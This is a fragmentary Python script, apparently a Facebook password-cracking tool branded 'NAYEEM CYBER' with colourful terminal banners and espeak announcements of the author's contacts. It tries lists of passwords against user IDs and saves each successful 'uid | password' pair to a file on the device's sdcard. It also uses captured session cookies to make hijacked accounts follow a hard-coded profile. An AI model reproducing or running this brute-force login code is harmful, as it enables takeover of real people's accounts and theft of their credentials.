...
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS NAYEEM CYBER KING NAYEEM\033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH NAYEEM CYBER KING OFF NAYEEM "')
os.system("git pull")
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://x.facebook.com/itz.ongkon.mallik', {
...
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢N🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
os.system('espeak -a 300 "author Nayeem "')
os.system('espeak -a 300 "Facebook  Nayeem Nawaz "')
os.system('espeak -a 300 "whathapp 0 1 8 2 7 6 7 3 2 5 3"')
os.system('espeak -a 300 "github nayeemvai"')
os.system('espeak -a 300 "telegram 0 1 8 2 7 6 7 3 2 5 3"')
os.system('espeak -a 300 "imo 0 1 8 2 7 6 7 3 2 5 3 "')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                import os
                open('/sdcard/𝗡𝗔𝗬𝗘𝗘𝗠-𝟬𝟰𝟵𝟵-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                # open('/sdcard/\033[38;5;46m𝗡𝗔𝗬𝗘𝗘𝗠-𝟬𝟰𝟵𝟵-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['𝗡𝗔𝗬𝗘𝗘𝗠 CYBER','𝗡𝗔𝗬𝗘𝗘𝗠-CYBER ','𝗡𝗔𝗬𝗘𝗘𝗠l CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝𝐍𝐀𝐘𝐄𝐄𝐌𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
